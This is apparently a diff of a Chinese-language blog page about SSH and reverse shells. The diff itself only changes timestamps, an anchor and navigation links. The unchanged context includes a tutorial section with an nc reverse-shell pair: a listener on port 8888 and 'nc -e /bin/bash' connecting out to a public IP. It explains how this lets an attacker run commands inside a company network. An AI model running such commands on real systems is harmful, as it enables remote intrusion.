@@ -89,7 +89,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;images&#x2F;SSH-%E5%85%AC%E5%8F%B8%E7%94%B5%E8%84%91.png">
 <meta property="og:image" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;images&#x2F;SSH-%E9%BB%91%E5%AE%A2%E7%AB%AF.png">
-<meta property="og:updated_time" content="2020-04-22T09:23:29.100Z">
+<meta property="og:updated_time" content="2020-04-22T09:27:53.618Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http:&#x2F;&#x2F;heyaff.github.io&#x2F;images&#x2F;SSH-%E5%85%AC%E5%8F%B8%E7%94%B5%E8%84%91.png">
 
@@ -327,7 +327,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-22T17:23:29+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-22T17:27:53+08:00">
                 2020-04-22
               </time>
             
@@ -394,8 +394,7 @@
       
         <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>内网shell反弹的本质是与公网服务器建立连接，将公网服务器传输过来的命令执行，并将结果返回。</p>
 <p>比如命令注入，不需要知道机器的账号密码，直接反弹出来</p>
-<p>虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。</p>
-<a id="more"></a>
+<p>虽然公司内网的机器没有暴漏给公网，但公网可以执行命令在这台机器上。前提条件：内网机器可访问互联网。<a id="more"></a></p>
 <p>第一种——nc反弹shell</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑客机器：nc -lvp 8888</span><br><span class="line">公司内网机器：nc -e /bin/bash 公网IP 8888</span><br></pre></td></tr></table></figure>
 
@@ -445,8 +444,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/04/03/api/" rel="next" title="api">
-                <i class="fa fa-chevron-left"></i> api
+              <a href="/2020/03/31/ddos/" rel="next" title="DDoS攻击">
+                <i class="fa fa-chevron-left"></i> DDoS攻击
               </a>
             
           </div>
@@ -454,6 +453,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/22/api/" rel="prev" title="api">
+                api <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
